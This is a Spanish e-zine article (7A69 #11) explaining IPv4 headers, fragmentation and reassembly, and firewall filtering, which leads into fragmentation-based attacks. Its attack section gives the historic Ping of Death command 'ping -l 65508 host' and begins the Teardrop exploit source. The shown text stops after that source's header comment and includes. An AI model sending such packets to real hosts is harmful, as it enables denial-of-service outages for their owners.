@@ -1,0 +1,1804 @@
+     -=( 7A69#11 )=--=( art15 )=--=( Fragmentacion de IP )=--=( Lykeios )=-
+
+ATAQUES BASADOS EN FRAGMENTACION DE IP
+======================================
+
+Indice
+======
+
+1.- Introduccion
+2.- Internet Protocol (IP)
+  2.1.- Generalidades
+  2.2.- Fragmentacion
+3.- Filtrado de paquetes
+4.- Ataques
+  4.1.- DoS
+  4.2.- Bypass firewalls
+5.- Prevision de futuro
+6.- Bibliografia
+
+
+1.- Introduccion
+^^^^^^^^^^^^^^^^
+Buenas noches. Soy Lykeios.
+
+Si bien los ataques basados en fragmentacion de paquetes IP no son nada nuevo,
+lo cierto es que no se ha escrito mucho sobre el tema. Esta fue una de las
+razones que me impulsaron a escribir este texto; y tambien la curiosidad,
+porque he de decir que cuando me plantee este proyecto apenas tenia idea de
+la utilidad de esta caracteristica del protocolo IP.
+
+Yo he aprendido mas que nadie con este texto; conoci mas a fondo el IP, las
+tecnicas de filtrado de paquetes, he escrito mi primer escaneador de puertos
+e incluso me he acercado al IPv6 para escribir el punto 5. En fin, espero
+que tu al menos puedas sacar algo en limpio de todo esto.
+
+Si detectas cualquier error o equivocacion, fruto del descuido o del puro
+desconocimiento, mandame un mail. Tambien me puedes mandar un mail con
+cualquier duda o sugerencia, >> referente al texto <<, a :
+
+lykeios@bigfoot.com
+
+Bueno basta de charla, alla vamos.
+
+
+2.- Internet Protocol
+^^^^^^^^^^^^^^^^^^^^^
+
+  2.1.- Generalidades
+
+El Internet Protocol (IP), junto con el Transmision Control Protocol (TCP), es
+la base de lo que hoy conocemos como Internet. Comunmente se le situa en la
+Capa de Red, aunque dependiendo del libro o manual que consultes la compartira
+con el TCP o incluso tomara parte de la Capa de Enlace.
+
+Como en cualquier modelo de redes basado en capas (existen otros?), cada una
+de estas se sirve de los servicios de la inferior y ofrece otros servicios a
+la superior. De forma que para cada capa resulta transparente la forma en que
+la inferior consigue ofrecerselos.
+
+De forma grafica y para el caso concreto del modelo TCP/IP (internet),
+quedaria como sigue:
+
+                        ......
+        ---------------------------------------------
+       |   Capa de Transporte (TCP, UDP)             |
+        ---------------------------------------------
+                          ||
+        ---------------------------------------------
+       |   Capa de Red   (IP && ICMP)                |
+        ---------------------------------------------
+                          ||
+        ---------------------------------------------
+       |   Capa de Enlace (802.3/ethernet,PPP,...)   |
+        ---------------------------------------------
+                        ......
+
+Por encima de la capa de transporte tendriamos los protocolos de aplicacion:
+SMTP, FTP, TELNET, HTTP,... mientras que por debajo de la de enlace quedarian
+los protocolos de la Capa Fisica, que tambien los hay; aunque lo cierto es que
+normalmente ya van implementados en la parte MAC (Control de Acceso al Medio)
+de la Capa de Encale (asi ocurre, por ejemplo, en las redes ethernet, token
+bus (802.4) y token ring (802.5))
+
+Como habras visto, en la Capa de Red tambien aparece el ICMP (Internet Control
+Message Protocol), debido a que, aunque se trata de un protocolo aparte, en
+realidad es una parte mas de IP. Hasta el punto que todos los modulos de IP
+deben tener implementado el ICMP.
+
+La unidad basica de IP es el datagrama (IP datagram). Y el proposito de IP es
+permitir el flujo de estos datagramas entre diferentes redes interconectadas.
+Para conseguirlo se parte de la base de que todo host o gateway posee un
+modulo IP, cada vez que le llega un datagrama comprueba si es para el: en caso
+afirmativo lo procesa y en caso negativo lo manda hacia su destino por el
+"mejor camino posible" (termino mucho mas ambiguo de lo que pudiera parecer).
+
+Los dos grandes servicios que ofrece IP para esta tarea a las capas superiores
+son: direccionamiento y encaminamiento. Que que? Que no ves la diferencia
+entre una cosa y la otra? Puede que si te lo digo en ingles: addressing and
+routing. Tampoco?
+
+Dejame que te lo explique, que es muy sencillo. Cuando hablo de
+direccionamiento me refiero a que se pueda identificar cada host o gateway de
+forma univoca (darles una direccion). Mientras que cuando hablo de
+encaminamiento me refiero a las pautas o normas a seguir para que un
+determinado datagrama llegue a su destino.
+
+Direccionamiento
+----------------
+
+Cada host tendra asignada una direccion IP (IP address). Es importante aclarar
+aqui que no se debe confundir la direccion IP con el(los) nombre(s) del host.
+IP trabaja unicamente con direcciones IP, dejando para protocolos superiores
+el paso de nombres a direcciones IP (DNS,Domain Name System), y para
+protocolos inferiores el paso de direccion IP (logica) a direccion fisica
+(ARP, Address Resolution Protocol). Ejemplo:
+
+Nombre          : www.perico.org
+Direccion IP    : 193.234.44.101
+Direccion fisica: 08-00-21-2E-5D-0C
+
+Tambien hay que tener en cuenta que una maquina (fisica) puede tener asociadas
+varias direcciones IP, simplemente soportando varios interfaces de red. Como
+ejemplo tipico podriamos poner un router. 
+
+Las direcciones IP tienen una longitud fija de 4 bytes (32 bits). Representada
+como cuatro numeros de un byte separados por puntos.
+[ N. del A: Aunque en el RFC791 se evita usar el termino 'byte' (utilizando en
+su lugar 'octect'), debido a que en ciertos entornos un byte puede no ser 8
+bits, creo que quedara mas claro para la mayoria si utilizo la palabra con la
+que estamos mas familiarizados.]
+
+Cada direccion esta formada por un numero de red seguido de la direccion
+local. De esta forma las redes se dividen en clases dependiendo del espacio
+asignado a cada parte de la direccion.
+
+Clase A : Su bit mas significativo es cero. Los siguientes 7 bits componen el
+numero de red, mientras que los 24 bits restantes formaran la direccion local.
+                                
++-+-------+------------------------+
+|0| # Red |           Host         |
++-+-------+------------------------+
+
+Como puedes ver, en redes de clase A se pueden direccionar hasta 16.777.214
+hosts. (Casi na').
+
+Clase B: Sus dos bits mas significativos son '10'. Los siguientes 14 bits son
+el numero de red y los 16 bits restantes la direccion local.
+
++--+--------------+----------------+
+|10|    # Red     |       Host     |
++--+--------------+----------------+
+
+Una clase B permite direccionar 65534 hosts.
+
+Clase C: Los tres bits mas significativos son '110'. Los siguientes 21 bits
+son el numero de red y los 8 ultimos componen la direccion local.
+
++---+---------------------+--------+
+|110|        # Red        |  Host  |
++---+---------------------+--------+
+
+Las clases C permiten direccionar tan solo 254 hosts (mas que sufucientes en
+muchos casos).
+
+Se podria decir que si las direcciones de una red coinciden en sus tres
+primeras partes es que les han a signado una clase C, mientras que si
+coinciden solo las dos primeras es que es una clase B, etc. Aunque la verdad
+es que con la utilizacion de tecnicas como la division de una red en subredes,
+o la asignacion de clases C consecutivas en lugar de una clase B (para ahorro
+de direcciones), lo dicho anteriormente deja de cumplirse.
+
+Para que te hagas una idea, por lo que yo se Servicom tiene asignada una
+clase B.
+
+Ciertos tipos de direcciones estan reservadas, como por ejemplo:
+
+127.*.*.*     ==> para la propia maquina.
+255.255.255.* ==> para enmascarar.
+...muchas otras...
+
+Existen otras dos clases con propositos distintos a los vistos hasta ahora:
+
+Clase D: Se utilizan a la hora de mandar un datagrama con *varios* hosts
+destino (IP multicast). El formato es el siguiente:
+
++----+-----------------------------+
+|1110|       Multicast address     |
++----+-----------------------------+
+
+Las razones para querer enviar un datagrama a varios destinos pueden ser muy
+diversas (como un aviso de actualizacion a una base de datos distribuida); y
+la razon de que se haga asi en lugar de enviar un datagrama a cada host es
+evidente: se intenta congestionar la red lo menos posible.
+
+La forma de gestionar el IP multicast es muy sencilla; cada host decide cuando
+se une y cuando se da de baja de un 'multicast group'. Cada grupo tendra
+asignada una direccion de multicast, de tal forma que cuando se emite un
+datagrama con destino a esa direccion, todos los hosts que pertenecen a ese
+grupo aceptan el datagrama.
+
+Las direcciones de multicast solo tienen sentido si aparecen en el campo de
+destino. Nunca apareceran en el campo de direccion origen.
+
+Tambien existen direcciones de multicast reservadas, como:
+
+224.0.0.1 ==> Todos los hosts de esta red.
+224.0.0.2 ==> Todos los routers de esta red.
+...muchas otras...
+[N. del A: Tened en cuenta que "todos" significa 'todos los que participen
+en multicast', ok?]
+
+Clase E: Reservadas para futuro uso.
+
++-----+----------------------------+
+|11110|                            |
++-----+----------------------------+
+
+No parece que se vayan a utilizar nunca.
+
+Encaminamiento
+--------------
+
+Como ya dije, el encaminamiento consiste en una serie de normas que hacen que
+un datagrama llegue a su destino. En este proceso tomaran parte todos los
+hosts intermedios por los que pase el datagrama, asi como el origen y el
+destino del mismo.
+
+Existen dos tipos de encaminamiento: el directo, cuando la direccion destino
+pertenece a la misma red que la direccion origen; e indirecto, que es
+precisamente lo contrario. La mayor diferencia entre uno y otro es que,
+mientras que en el segundo es necesaria la participacion de gateways o
+routers, en el primero no.
+
+El caso de encaminamiento directo es muy sencillo, el modulo IP del host
+origen manda el datagrama directamente al host destino despues de comprobar,
+en su tabla de enrutado, que este se encuentra en su propia red.
+
+Para el caso de encaminamiento indirecto la cosa se complica; en un caso
+sencillo en el que los hosts origen y destino se encuentran en dos redes
+conectadas por un router, el proceso seria el siguiente:
+
+El modulo IP del host origen comprueba en su tabla de enrutado que el host
+destino no pertenece a su red. En la propia tabla de enrutado encontrara el
+router al que debe enviar el datagrama para que llegue a la red del host
+destino. Crea el datagrama y lo manda a ese router.
+
+Cuando el modulo IP del router recibe el datagrama mira la direccion del host
+destino, comprobando que se encuentra en una segunda red. Mirando en su tabla
+de enrutado el router ve que puede mandar el datagrama de forma directa en esa
+segunda red y lo hace. Si no pudiera mandarlo directamente (por no encontrarse
+en una de las redes a las que pertene ese router), lo enviaria a otro router
+(que tambien habria elegido consultando su tabla de enrutado).
+
+El modulo IP del host destino comprueba que la direccion destino del datagrama
+coincide con la propia y lo pasa al protocolo superior.
+
+En los ejemplos mas tipicos, los datagramas deben pasar por varias redes
+intermedias antes de llegar al host destino. Debiendo pasar por varios routers
+y tomando, cada uno de ellos, las decisiones necesarias para el proximo salto
+unicamente.
+
+El camino seguido por un datagrama viene determinado por las tablas de
+enrutado de los hosts y routers por los que pasa. Los factores que intervienen
+en la eleccion son muchos, pudiendo perfectamente variar este camino aunque
+los hosts origen y destino sean los mismos. Tambien se puede controlar hasta
+cierto punto este camino por ciertos campos de la cabecera del datagrama que
+veremos en el proximo apartado.
+
+Cabecera IP
+-----------
+
+Los campos que componen la cabecera de cualquier datagrama son los siguientes:
+
++-------------------------------- RFC791 ------------------------------------+
+
+    0                   1                   2                   3   
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |Version|  IHL  |Type of Service|          Total Length         |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |         Identification        |Flags|      Fragment Offset    |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |  Time to Live |    Protocol   |         Header Checksum       |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                       Source Address                          |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                    Destination Address                        |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                    Options                    |    Padding    |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
++-------------------------------- RFC791 ------------------------------------+
+
+Siendo el significado y el uso de cada uno de ellos:
+
+* Version. (4 bits)
+La version del protocolo IP que se esta utilizando. En la actualidad vale
+siempre '0100' (4), debido a que se sigue usando el IPv4. Cuando se pase al
+ya famoso IPv6, en la cabecera de cualquier datagrama IPv6 habra un campo
+analogo que valdra '0110' (6, logico, no?).
+
+Quizas te preguntes para que hace falta este campo si cuando se cambie de
+version todos los datagramas seran IPv6; la razon es sencilla, el paso de IPv4
+a IPv6 (como cualquier otra evolucion de un protocolo) no se producira de la
+noche a la ma¤ana, sino que sera gradual (se calcula que durara unos 10 a¤os),
+teniendo que convivir ambas versiones durante ese tiempo.
+
+* IHL - Internet Header Length. (4 bits)
+Pues eso, la longitud de la cabecera del datagrama en unidades de 32 bits.
+Para un datagrama simple, sin opciones, valdra siempre '0101' (5).
+
+* Type of Service. (8 bits)
+Permite controlar ciertos parametros de la transmision de datagrama. Tiene la
+siguiente forma:
+
+ 0 1 2 3 4 5 6 7
++-+-+-+-+-+-+-+-+
+| PRE |D|T|R|0|0|
++-+-+-+-+-+-+-+-+
+
+PRE ==> Prioridad (Precedence).
+Viene a determinar la importancia o urgencia del datagrama. De mayor a menor
+prioridad:
+
+111 - Network Control
+110 - Internetwork Control
+101 - CRITIC/ECP
+100 - Flash Override
+011 - Flash
+010 - Immediate
+001 - Priority
+000 - Routine
+
+D ==> Demora (Delay)
+
+0 - Demora normal
+1 - Demora baja
+
+T ==> Throughput (joder, no se como traducirlo.. :( )
+
+0 - Normal throughput
+1 - High throughput
+
+R ==> Confianza (Reliability)
+
+0 - Confianza normal
+1 - Alta confianza
+
+Los bits 6 y 7 estan reservados para futuros usos.
+
+Con estos parametros se puede determinar, hasta cierto punto, la prioridad
+del datagrama; aunque se deja a cada red la responsabilidad de decidir la
+forma en que responde a estos campos.
+
+* Total Length. (16 bits)
+Como su nombre indica es la longitud total del datagrama expresada en bytes.
+Esto incluye la cabecera y los datos.
+
+Al tener un tama¤o de 16 bits, fija el tama¤o maximo de un datagrama a 65535
+bytes. Aunque normalmente se trabajara con tama¤os mas peque¤os: 1500 bytes,
+576 bytes, etc.
+
+* Identification. (16 bits)
+Un n£mero que permite, junto con las direcciones origen y destino y el campo
+protocol, identificar al datagrama. Se utiliza a la hora de reensamblar los
+fragmentos de un mismo datagrama.
+
+* Flags. (3 bits)
+Pues eso, tres flags de control. Aunque en realidad solo dos tienen funcion
+asignada.
+
+ 0  1  2
++-+--+--+
+|0|DF|MF|
++-+--+--+
+
+Bit 0 ==> No es usado. Valdra siempre '0'.
+
+Bit 1 ==> No fragmentar (Don't Fragment).
+
+          '0' - Se puede fragmentar.
+          '1' - No fragmentar (Don't Fragment).
+
+Bit 2 ==> Mas fragmentos.
+
+          '0' - Ultimo fragmento.
+          '1' - Quedan mas fragmentos.
+
+El uso de estos dos flags sera visto mas en profundidad en el apartado
+dedicado a la fragmentacion de datagramas.
+
+* Fragment Offset. (13 bits)
+Indica al lugar que ocupa un fragmento dentro de un datagrama. Se expresa en
+unidades de 8 bytes.
+
+Tambien se vera su forma de uso en el apartado de fragmentacion.
+
+* Time to Live. (8 bits)
+Indica el tiempo maximo que un datagrama puede estar 'suelto' por la red.
+Aunque se expresa en segundos, la forma en la que realmente funciona es
+restandole una unidad en cada host por el que pasa. Por lo que viene a
+representar el numero de saltos que puede dar.
+
+Si en algun momento el valor de este campo es cero, el datagrama es destruido,
+se pierde.
+
+* Protocol. (8 bits)
+Indica el protocolo al que pertenece el paquete que esta siendo transportado
+por el datagrama.
+
+Algunos valores que puede tomar son:
+
+Binario      Decimal   Protocolo
+--------     -------   ---------
+00000001     1         ICMP
+00000100     4         IP (IP llevando paquetes IP, encapsulacion)
+00000110     6         TCP
+00010001     17        UDP
+
+Entre otros muchos.
+
+* Header Checksum. (16 bits)
+Se utiliza para asegurar la integridad de los datos de la cabecera.
+
+El algoritmo que se utiliza es muy simple: se trata del complemento a 1 del
+complemento a 1 de la suma de todas las palabras (16 bits) de la cabecera. A
+la hora de calcularlo se supone que el campo 'Header Checksum' vale cero.
+
+Debido a que algunos de los campos de la cabecera van cambiando, como el 'Time
+to Live' o los asociados a fragmentacion si esta se produce, el valor del
+'Header Checksum' se verifica y se recalcula en cada host por el que pasa.
+
+* Source Address. (32 bits)
+Direccion IP del host que manda el datagrama.
+
+* Destination Address. (32 bits)
+Direccion IP del host destino del datagrama.
+
+* Options. (variable: 0 - 40 bytes)
+Este campo es el unico no-obligatorio de la cabecera (bueno, junto con el
+'Padding'. Pero como vereis ese no es un "verdadero" campo). Aunque el RFC791
+especifica que es obligatoria su implementacion en todo modulo IP, lo cierto
+es que no todos los host tratan las opciones; o incluso las tratan de
+diferente manera.
+
+No voy a pararme a explicar cada una de las opciones, si realmente estais
+interesados en este campo en concreto leeros el standard. Solo pondre la
+lista de las que hay:
+
+- End of option list.
+- No operation.
+- Security.
+- Loose source routing.
+- Strict source routing.
+- Record route.
+- Stream identifier.
+- Internet timestamp.
+
+* Padding. (variable)
+Se utiliza para asegurar que la cabecera termine en un multiplo de 32 bits.
+Se usa como relleno de las opciones cuando estas terminan en mitad de un
+dword (32 bits). Su valor es siempre cero.
+
+
+  2.2.- Fragmentacion.
+
+La fragmentacion nace como solucion a un problema con el que se encontraron
+los creadores del protocolo IP. Para entender este problema es necesario
+conocer una caracteristica que poseen todas las redes: el MTU (Maximun
+Transmission Unit) o Unidad Maxima de Transporte; que no es otra cosa que el
+tama¤o maximo que puede tener un datagrama para circular por esa red. Este
+parametro puede variar de unas redes a otras: 1500 bytes en ethernet, 2044 en
+proNET-10, etc. Una vez llegados a este punto cabe preguntarse que ocurre
+cuando un datagrama tiene que atravesar una red cuya MTU es menor que su
+tama¤o. Como respuesta a esta pregunta nacio la fragmentacion de IP.
+
+Para controlar el proceso de fragmentacion y reensamblado de datagramas se
+utilizan varios campos de la cabecera:
+
+* Flag DF.
+Si este flag esta activo ('1') el datagrama no puede ser fragmentado nunca. Si
+se diese el caso de llegar a una red con MTU mas peque¤a que el tama¤o del
+datagrama, este seria destruido.
+
+* Flag MF.
+Mediante este flag se marca el ultimo fragmento de un datagrama ('0').
+
+* Fragment Offset.(FO)
+Con este campo se controla la situaci¢n del fragmento dentro del datagrama.
+
+* Total Length. (TL)
+Una vez restado el tama¤o de la cabecera indicara el numero de bytes del
+datagrama original que lleva ese fragmento. Daros cuenta que con el resto de
+campos sabiamos si era o no un fragmento y el lugar donde comenzar a poner los
+datos, pero no EL NUMERO DE BYTES QUE DEBIAMOS PONER.
+
+Si MF = '0' y FO = 0, el datagrama no es un fragmento. Si MF = '1' y FO = 0,
+se trata del primer fragmento de un datagrama. Si MF = '0' y FO != 0, se trata
+del ultimo fragmento de un datagrama. Cualquier otro fragmento tendra el flag
+MF = '1' y el FO != 0.
+
+Cuando un datagrama llega a un gateway de entrada a una red cuya MTU es menor
+que el tama¤o del mismo, el modulo IP del gateway comprueba el flag 'DF' de la
+cabecera del datagrama. Si esta activo el datagrama es destruido. En caso
+contrario se procede a la fragmentacion del mismo.
+
+Cada fragmento de un datagrama no es mas que otro datagrama IP. Por supuesto
+cada fragmento tendra sus campos MF y FO acordes con su situacion en el
+antiguo datagrama y por lo tanto su Checksum tambien cambiara. Todos los
+fragmentos creados seran de longitud igual al MTU de la red, excepto el
+ultimo. Los fragmentos de un datagrama se distinguiran de los de otro mediante
+la conjuncion de los campos: identification, protocol, source y destination
+address.
+
+En principio el antiguo datagrama sera dividido en dos fragmentos, el primero
+tendra el flag MF = '1', el FO = "FO del antiguo datagrama" y el Total Length
+(TL) = MTU de la red en la que entra. En el segundo fragmento no iran
+incluidas algunas partes del campo 'options', por lo que el campo IHL debe ser
+recalculado. Se le a¤aden los datos restantes del datagrama original, tendra
+como FO el "FO del antiguo datagrama" + "(MTU - (IHL del anterior
+fragmento)*4)/8" (ya que los datos de este fragmento han de comenzar donde
+terminan los datos del anterior, por eso se resta la longitud de la cabecera
+del anterior fragmento y se divide entre 8 porque el campo FO va en unidades
+de 8 bytes) y se pondra como MF el MF del antiguo datagrama. El primer
+fragmento es enviado mientras que con el segundo se repite este mismo proceso
+hasta que los datos restantes quepan en un solo datagrama.
+
+[N. del A: Puede que el parrafo anterior me haya quedado algo dificil de
+entender. Si no te has enterado de nada intenta leerlo siguiendo el ejemplo
+que hay un poco mas abajo. Creeme: en realidad no es muy dificil.]
+
+La razon de que se tenga en cuenta el FO del datagrama que se esta
+fragmentando, es que podriamos estar dividiendo en fragmentos un datagrama IP
+que ya sea un fragmento en si mismo. Me explico: Supongamos que un datagrama
+completo (no fragmentado aun) de tama¤o 2048 bytes llega a una red de MTU =
+1500 bytes. Este datagrama sera fragmentado segun el proceso anterior en dos
+fragmentos de la siguiente forma:
+
+Datos que debo enviar = 2048 - 5*4 (IHL) = 2028
+- fragmento1:
+             IHL = 5 (20 bytes, no hay opciones)
+             TL  = 1500 (MTU)
+             MF  = '1' (quedan mas fragmentos)
+             FO  = 0 (ya que el anterior datagrama no estaba fragmentado)
+
+Datos que aun debo enviar = 2028 - (1500 - 20) = 548
+- fragmento2:
+             IHL = 5
+             TL  = 568 (548 bytes de datos del datagrama original + IHL*4)
+             MF  = '0' (ultimo fragmento)
+             FO  = 0 + (1500 - 20)/8 = 185
+                       ^^^^^^^^^^^^^
+                             || Parte del fragmento1 que representa datos del
+                                datagrama original.
+
+Supongamos que en su camino hacia su host destino el fragmento2 (de 568
+bytes) debe atravesar una red de MTU = 404. Por fuerza debera ser fragmentado
+de nuevo, con lo que obtendremos otros dos fragmentos de la forma:
+
+
+Datos que debo enviar = 568 - 20 = 548
+- fragmento2.1:
+               IHL = 5
+               TL  = 404 (MTU)
+               MF  = '1' (quedan mas fragmentos)
+               FO  = 185 (ya que aunque sea el comienzo de un datagrama, ese
+                          datagrama lleva datos que deben ser colocados a
+                          partir de esta posicion)
+
+Datos que aun debo mandar = 548 - (404 - 20) = 164
+- fragmento2.2:
+               IHL = 5
+               TL  = 184 (164 bytes de datos + 20 de cabecera)
+               MF  = '0' (ultimo fragmento)
+               FO  = 185 + (404 - 20)/8 = 233
+
+[N. del A: Si te has perdido tambien con el ejemplo, recuerda: el campo TL va
+en bytes, el IHL en unidades de 4 bytes, y el FO en unidades de 8 bytes.]
+
+Solo como comprobacion: 233*8 + 164 = 2028 bytes. (Hey! Puede que sea algo
+retorcido, pero funciona ;] ).
+
+Creo que queda claro por que debemos tener en cuenta el FO anterior, no?
+
+Suponiendo que el fragmento1 llego al host destino por otro camino y no tuvo
+que ser fragmentado, tendremos que el datagrama original llega a su destino
+en forma de tres fragmentos. Sabemos que no sera reensamblado por ningun
+host intermedio ya que el RFC791 lo exige asi. Segun he leido la razon para
+esto se encuentra en la segunda ley de la termodinamica (sigo sin saber si el
+libro lo decia de co¤a o no :)), que dice que el proceso para recomponer un
+elemento siempre conlleva mas trabajo que el de dividirlo. Otra explicacion
+mas aceptada es que se intentan evitar sucesivos procesos: fragmentacion -
+reensamblado - fragmentacion - ...
+
+Cuando un datagrama llega a su destino el modulo IP comprueba los campos MF y
+FO para saber si es un fragmento o no. En caso de no serlo se le quita la
+cabecera y se pasan los datos al protocolo superior. Pero en caso de ser un
+fragmento tendra que ser reensamblado. Hay que tener en cuenta que, aunque los
+fragmentos hayan sido enviados en orden, no hay nada que los obligue a llegar
+asi. Con lo que para recomponer el datagrama no basta ir cogiendo los
+fragmentos segun van llegando, quitarles la cabecera y pegarlos uno detras de
+otro. Lo que se hace en realidad es mantener un buffer del tama¤o maximo que
+puede tener un datagrama IP (65535 bytes), e ir colocando los datos de cada
+fragmento en la posicion del buffer indicada por el campo FO. Cuando llega el
+ultimo fragmento (MF = '0' y desde luego FO != 0 (sino no estariamos aqui :)),
+se comprueba si el resto del buffer esta completo o faltan partes (que haya
+llegado el "ultimo fragmento" no quiere decir que hayan llegado TODOS los
+fragmentos) y, una vez que este completo, se le pasa al protocolo superior.
+
+En el proceso de reensamblado vuelven a intervenir los mismos campos: MF, FO y
+TL. Como ya dije antes, el modulo IP reconocera los fragmentos pertenecientes
+a un mismo datagrama por los campos: identification, protocol, source y
+destination address. La parte del buffer de reensamblado que formaria la
+cabecera del datagrama se rellena con la cabecera del primer fragmento
+(MF = '1' y FO = 0), el resto de cabeceras son ignoradas (excepto para
+comprobar que se trata de un fragmento del mismo datagrama, y para conocer el
+offset claro).
+
+Hay que decir que el tiempo que un host espera a que lleguen todos los
+fragmentos de un datagrama no es infinito, se utiliza un contador que
+disminuye con el tiempo y que se actualiza cada vez que llega un fragmento,
+tomando el valor maximo entre el valor actual del contador y el valor del
+campo TTL del fragmento. En el momento que el contador llega a cero los
+fragmentos son descartados y el datagrama completo se pierde.
+
+Como ultimo punto a tener en cuenta en relacion al proceso de reensamblado,
+dire que el RFC791 deja abierta la posibilidad a que los fragmentos se solapen
+total o parcialmente, diciendo que en ese caso tengan preferencia los ultimos
+datos en llegar (o sea, que se sonbreescriba los que habia); aunque esto
+ultimo no siempre se respeta, aun menos tras la aparicion de los ataques que
+se trataran en este texto.
+
+
+3.- Filtrado de Paquetes
+^^^^^^^^^^^^^^^^^^^^^^^^
+Bueno, la verdad es que tenia pensado extenderme en esta seccion mas de lo que
+en realidad hare. Se podrian escribir (y de hecho se han escrito) textos y
+manuales unica y exclusivamente sobre firewalls y de una extension
+considerable. Tipos que existen, configuraciones, ... Yo sencillamente voy a
+poner aqui una peque¤a introduccion para los que no tengan muy claro aun el
+funcionamiento de estos programas. El que este verdaderamente interesado puede
+leer textos como los de Marcus J. Ranum o los escritos por Paseante en SET9,
+10 y 11; por citar algunos ejemplos.
+
+Los firewalls aparecieron como consecuencia logica de la importancia que la
+seguridad ha ido adquiriendo en internet. El proposito general, y con el que
+nacieron, era aislar de alguna manera la red o el host propios del resto de
+internet. Para ello se imponen ciertas normas y restricciones a lo que se
+permite entrar a la red propia, y tambien a lo que se permite salir de nuestra
+red al exterior.
+
+Hasta la aparicion de los firewalls el control que se tenia sobre los
+servicios que ofrecia un host, era unicamente el ofertarlo o no (vale, vale,
+vamos a olvidarnos un rato de 'host.allow' 'host.deny', ACL's y demas...). Si
+el host tenia un servidor FTP, por ejemplo, ese servidor era visible para
+TODOS los demas hosts de internet. Con los firewalls se intenta controlar un
+poco mas quien tiene acceso a ciertos servicios y quien no.
+
+Las normas o reglas de filtrado se basan (en principio) en el host y el puerto
+del que procede un paquete, y el host y el puerto al que se dirige. 
+                     
+Supongamos ahora que para mejorar la seguridad de una intranet colocamos un
+firewall en su entrada, y obligamos a todos los paquetes que entran y salen de
+la red a pasar por el (normalmente se hara con un router que posea la
+funcionalidad de filtrado). Podriamos establecer restricciones de forma que
+nadie del exterior pudiera acceder al puerto 23 (telnet) o prohibir la salida
+de la intranet de paquetes dirigidos al puerto 80 (http), si no queremos que
+nuestros usuarios puedan acceder a paginas web exteriores. Etc, etc. Las
+configuraciones de filtrado se basan normalmente en politicas de accesibilidad
+y seguridad de la red, pudiendo llegar a ser verdaderamente complejas.
+
+Cada vez que le llegue un datagrama, el firewall comprobara los campos source
+y destinatios address de la cabecera IP, y los campos source y destination
+port de la cabecera TCP o UDP (dependiendo del caso). Con esos datos chequeara
+las restricciones que hayan sido configuradas y decidira si lo deja pasar o lo
+"quema".
+
+Comentar tambien que una practica bastante extendida es descartar los paquetes
+(TCP en este caso) que tengan el bit SYN='1' y ACK='0', tipico paquete de
+peticion de conexion.
+
+Si el tipo de firewall del que estamos hablando fuera un 'proxy' o 'aplication
+gateway', las restricciones prodrian fijarse tambien al nivel de aplicacion.
+
+
+4.- Ataques
+^^^^^^^^^^^
+
+  4.1.- DoS (Denial of Service)
+
+Puede que despues de haber leido todo lo anterior, pienses que cualquier
+ataque que se base en la fragmentacion de datagramas debe ser, por fuerza,
+tremendamente complejo. Lo cierto es que no es asi, y por eso mismo voy a
+empezar por estos.
+
+Si te digo que ya conoces, y posiblemente hayas utilizado, al menos dos de
+estos ataques, te sorprenderia? :) Sigue leyendo...
+
+
+Ping of Death
+-------------
+
+Si se¤or, amigo mio. El archiconocido y ya superado 'ping de la muerte', esta
+basado en un error a la hora de reensamblar un paquete demasiado grande.
+
+En realidad no tiene nada que ver con la aplicacion "ping", pudiendo
+reproducirse, en su momento, con cualquier programa capaz de enviar paquetes
+lo bastante grandes.
+
+La explicacion teorica es muy sencilla despues de haber leido el resto de este
+texto. Sabemos que el tama¤o maximo de un datagrama IP es de 65535 bytes, de
+los cuales 20 bytes pertenecen a la cabecera y el resto (65515) a los datos.
+El MTU de cualquier red es menor, con lo que la fragmentacion y el posterior
+reensamblado se hacen inevitables.
+
+Cuando los fragmentos llegan al host destino, este prepara un buffer del
+tama¤o maximo permitido para un datagrama, que es 65535, para proceder al
+reensamblado. Pero si el tama¤o del datagrama que enviamos es mayor... pues
+eso, el buffer se desvorda y las consecuencias son un hang o un crash de la
+maquina.
+
+La razon por la que se utilizo mayoritariamente el ping es que permitia fijar
+el tama¤o del paquete, con lo que hacia todo el trabajo el solito.
+
+Sabiendo que la cabecera IP es de 20 bytes (sin opciones) y que la cabecera
+de un ping (ICMP) es de 8 bytes, solo quedaba a¤adir los datos suficientes
+para llegar a 65536 (*sic*)...
+
+> ping -l 65508 host
+
+Este es el famoso comando que tiraba cualquier maquina con una sola linea.
+
+
+Teardrop
+--------
+
+En este caso lo que se aprovecha es un error a la hora de tratar los
+fragmentos que se solapan. Se envia el primer fragmento, y despues otro que
+lo solapa parcialmente pero que no lleva datos suficientes. El resultado
+es (era) tirar cualquier maquina Linux/NT/95.
+
+Este es el codigo, aunque ya es bastante 'viejo' y no es probable que
+funcione:
+
+/*
+ *  Copyright (c) 1997 route|daemon9  <route@infonexus.com> 11.3.97
+ *
+ *  Linux/NT/95 Overlap frag bug exploit
+ *
+ *  Exploits the overlapping IP fragment bug present in all Linux kernels and
+ *  NT 4.0 / Windows 95 (others?)
+ *
+ *  Based off of:   flip.c by klepto
+ *  Compiles on:    Linux, *BSD*
+ *
+ *  gcc -O2 teardrop.c -o teardrop
+ *      OR
+ *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+
